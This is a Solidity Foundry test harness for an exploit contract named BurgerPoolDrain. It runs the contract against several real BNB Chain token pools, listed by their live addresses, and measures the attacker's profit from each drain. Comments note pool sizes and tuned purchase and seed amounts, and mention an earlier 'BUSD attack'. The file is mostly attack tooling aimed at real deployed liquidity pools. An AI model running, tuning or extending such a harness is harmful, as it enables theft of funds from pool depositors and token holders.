// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerPoolDrain.sol";

contract BurgerPoolTest is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant ROCKS = 0xA01000C52b234a92563BA61e5649b7C76E1ba0f3;
    address constant bROOBEE = 0xE64F5Cb844946C1F102Bd25bBD87a5aB4aE89Fbe;
    address constant xBURGER = 0xe6DF05CE8C8301223373CF5B969AFCb1498c5528;
    address constant ETH_TOKEN = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;

    function _testPool(
        address token, uint256 buyWbnb, uint256 seedWbnb, uint256 pairPct, uint256 fundBnb
    ) internal returns (int256) {
        address att = makeAddr("attacker");
        vm.deal(att, fundBnb);
        vm.startPrank(att);

        uint256 before = att.balance;
        BurgerPoolDrain e = new BurgerPoolDrain();

        try e.attack{value: fundBnb - 1 ether}(token, buyWbnb, seedWbnb, pairPct) {
            vm.stopPrank();
            return int256(att.balance) - int256(before);
        } catch (bytes memory reason) {
            vm.stopPrank();
            emit log_named_string("FAILED", string(reason));
            return type(int256).min;
        }
    }

    // ROCKS: 354 WBNB pool
    function test_rocks() public {
        // Pool has 354 WBNB, try buy=700 (3.5x pool), seed=50 (BURGER/WBNB has ~30 now)
        int256 d = _testPool(ROCKS, 700 ether, 50 ether, 50, 1000 ether);
        emit log_named_int("ROCKS delta", d);
    }

    function test_rocks_noseed() public {
        // Try without seed (BURGER/WBNB already has ~30 WBNB from BUSD attack)
        int256 d = _testPool(ROCKS, 700 ether, 0, 50, 1000 ether);
        emit log_named_int("ROCKS noseed delta", d);
    }

    // bROOBEE: 139 WBNB pool
    function test_roobee() public {
        int256 d = _testPool(bROOBEE, 400 ether, 0, 50, 600 ether);
        emit log_named_int("bROOBEE delta", d);
    }

    // xBURGER: 84 WBNB pool
    function test_xburger() public {
        int256 d = _testPool(xBURGER, 250 ether, 0, 50, 400 ether);
        emit log_named_int("xBURGER delta", d);
    }

    // ETH: 24 WBNB pool
    function test_eth() public {
        int256 d = _testPool(ETH_TOKEN, 80 ether, 0, 50, 150 ether);
        emit log_named_int("ETH delta", d);
    }

    // USDT: 7 WBNB pool
    function test_usdt() public {
        int256 d = _testPool(USDT, 30 ether, 0, 50, 60 ether);
        emit log_named_int("USDT delta", d);
    }
}
